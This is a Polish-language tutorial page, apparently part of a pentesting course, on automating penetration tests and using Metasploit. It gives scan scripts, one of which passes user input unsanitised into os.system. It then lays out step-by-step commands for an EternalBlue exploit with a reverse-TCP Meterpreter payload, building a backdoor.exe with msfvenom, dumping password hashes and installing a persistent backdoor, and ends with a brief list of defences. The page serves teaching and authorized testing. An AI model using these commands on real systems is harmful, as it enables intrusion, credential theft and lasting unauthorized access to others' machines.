---
id: "automatyzacja-eksploatacja"
title: "🤖 Automatyzacja i eksploatacja"
sidebar_position: 13
---

# 🤖 Automatyzacja i eksploatacja

Automatyzacja testów penetracyjnych pozwala zwiększyć efektywność pracy pentestera, eliminując powtarzalne zadania i przyspieszając proces wykrywania podatności. W tej sekcji omówimy, jak pisać własne skrypty do pentestów oraz jak skutecznie korzystać z **Metasploit Framework**.

---

## ⚙️ Automatyzacja testów penetracyjnych

### **1️⃣ Jak pisać własne skrypty do pentestów?**
Automatyzacja testów może obejmować:
- **Skanowanie sieci**
- **Automatyczne wykrywanie podatności**
- **Eksploatację znanych luk**
- **Analizę logów i danych zebranych podczas testów**

#### **1.1 Tworzenie skryptu w Pythonie do automatycznego skanowania Nmap**
```python
import os

target = input("Podaj adres IP lub domenę: ")
os.system(f"nmap -A -p- {target}")
```
Zapisz plik jako `scan.py` i uruchom:
```bash
python3 scan.py
```

#### **1.2 Automatyczne wyszukiwanie ukrytych katalogów w Bash**
```bash
#!/bin/bash
TARGET=$1
WORDLIST=/usr/share/wordlists/dirb/common.txt
echo "Skanowanie: $TARGET"
gobuster dir -u $TARGET -w $WORDLIST -x php,html,txt
```
Zapisz plik jako `dirscan.sh`, nadaj uprawnienia i uruchom:
```bash
chmod +x dirscan.sh
./dirscan.sh http://example.com
```

#### **1.3 Automatyczna analiza logów HTTP**
```python
with open("access.log", "r") as file:
    for line in file:
        if "admin" in line or "login" in line:
            print(line)
```

---

## 🔥 Metasploit – podstawy i zaawansowane funkcje

Metasploit to jedno z najpotężniejszych narzędzi do eksploitacji systemów.

### **2️⃣ Podstawowe komendy w Metasploit**

#### **2.1 Uruchamianie Metasploit**
```bash
msfconsole
```

#### **2.2 Wyszukiwanie exploitów**
```bash
search smb
```

#### **2.3 Wybieranie exploita**
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

#### **2.4 Konfiguracja exploita**
```bash
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
```

#### **2.5 Uruchomienie ataku**
```bash
exploit
```

---

### **3️⃣ Zaawansowane techniki w Metasploit**

#### **3.1 Automatyczne wykrywanie podatności (db_nmap)**
```bash
db_nmap -A -p- 192.168.1.0/24
```

#### **3.2 Tworzenie backdoora w Metasploit**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
```

#### **3.3 Post-Exploitation: Pobranie haseł**
Po uzyskaniu dostępu do systemu można spróbować przechwycić hasła:
```bash
meterpreter > hashdump
```

#### **3.4 Tworzenie persistent backdoor**
```bash
run persistence -X -i 10 -p 4444 -r 192.168.1.100
```
Dzięki temu po restarcie maszyny backdoor nadal będzie aktywny.

---

## 🔐 Jak zabezpieczyć się przed automatycznymi atakami?
✅ **Monitorowanie ruchu sieciowego i nietypowych skanowań**
✅ **Blokowanie narzędzi typu Metasploit w systemach produkcyjnych**
✅ **Regularne aktualizacje systemów i patchowanie znanych podatności**
✅ **Wykrywanie i blokowanie backdoorów za pomocą EDR (Endpoint Detection & Response)**

---

Automatyzacja i Metasploit to kluczowe narzędzia w arsenale pentestera. Kolejnym krokiem będzie **Reverse Shell i Post-Exploitation**! 🚀
